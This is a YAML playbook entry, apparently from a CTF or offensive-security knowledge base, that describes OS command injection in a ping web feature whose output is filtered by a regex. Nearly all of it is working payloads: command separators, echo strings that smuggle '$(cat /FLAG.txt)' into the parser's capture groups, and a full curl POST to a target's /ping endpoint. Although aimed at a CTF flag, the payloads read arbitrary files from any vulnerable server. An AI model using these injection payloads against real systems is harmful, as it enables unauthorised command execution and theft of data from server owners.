name: output_parser_command_injection
category: web
tags: [command_injection, output_parsing, blind_injection, filter_bypass]
indicators:
  - "subprocess.Popen with shell=True"
  - "Ping or network utility with user input"
  - "Output parsed by regex before display"
  - "Partial character blacklist"

tricks:
  - name: "Step 1: Identify command injection"
    when: "Found ping functionality"
    how: "Test command separators"
    payload: |
      POST /ping
      ip_address=127.0.0.1; id
      # Command executes but output is filtered

  - name: "Step 2: Analyze output filtering"
    when: "Output not visible"
    how: "Check regex parsing logic"
    payload: |
      # Code parses output with regex:
      match = re.search(r'(.*?) packets transmitted, (.*?) received, (.*?)% packet loss', ping_output)
      # Only matching content is displayed

  - name: "Step 3: Trick the output parser"
    when: "Understand parsing logic"
    how: "Inject data into regex capture groups"
    payload: |
      # Craft output matching the regex pattern
      ip_address=;echo "$(cat /FLAG.txt) packets transmitted, 1 received, 0% packet loss"
      # Flag appears in "Packets Transmitted" field

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "Send crafted payload"
    payload: |
      curl -X POST http://TARGET/ping \
        -d 'ip_address=;echo "$(cat /FLAG.txt) packets transmitted, 1 received, 0% packet loss"'
      # Response: Packets Transmitted: flag{...}

  - name: "Alternative: Different injection positions"
    when: "Need variations"
    how: "Inject into other capture groups"
    payload: |
      # Inject into "received" field
      ip_address=;echo "1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss"
      
      # Inject into "packet loss" field
      ip_address=;echo "1 packets transmitted, 1 received, $(cat /FLAG.txt)% packet loss"

